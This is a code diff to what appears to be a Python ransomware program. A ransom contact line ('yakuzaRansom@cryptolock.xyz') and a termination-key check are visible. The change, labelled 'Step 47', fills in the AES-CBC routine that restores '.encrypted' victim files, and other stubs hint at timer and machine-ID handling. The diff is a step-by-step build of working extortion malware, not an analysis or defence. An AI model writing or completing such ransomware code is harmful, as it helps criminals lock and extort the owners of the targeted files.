@@ -20,7 +20,7 @@ from uuid import uuid4
 from Crypto.Cipher import AES
 from Crypto.Protocol.KDF import PBKDF2
 from Crypto.Random import get_random_bytes
-from Crypto.Util.Padding import pad
+from Crypto.Util.Padding import pad, unpad
 from requests import post, exceptions, get
 from time import sleep
 from PIL import Image, ImageTk
@@ -957,11 +957,38 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
             messagebox.showerror("Error", "Incorrect termination key.")
             return
 
-
-
-
+    # Step 47: Function to decrypt a single file
     def decrypt_file(self, file_path, key):
-        pass
+        try:
+            # Open file and read iv + encrypted data
+            with open(file_path, 'rb') as file:
+                iv = file.read(16)
+                encryptedData = file.read()
+
+            # Create a new Cipher to be able to Decrypt files
+            cipher = AES.new(key, AES.MODE_CBC, iv)
+            decryptedData = unpad(cipher.decrypt(encryptedData), AES.block_size)
+
+            # Remove .encrypted from filename
+            originalFilePath = file_path.rsplit(".encrypted", 1)[0]
+
+            # Create a new file in with the name same as an original file, then Write decrypted data to this file
+            with open(originalFilePath, 'wb') as file:
+                file.write(decryptedData)
+
+            # Delete the encrypted file
+            remove(file_path)
+
+            # Submit Log for a Successfully decrypted file
+            self.log(f"Successfully decrypted: {file_path}")
+            return True
+
+        # Handle Occurs exceptions
+        except Exception as e:
+            self.log(f"Failed to decrypt: {file_path} | Error: {e}")
+            return False
+
+
 
     def delete_timer_and_machine_id_files(self):
         pass
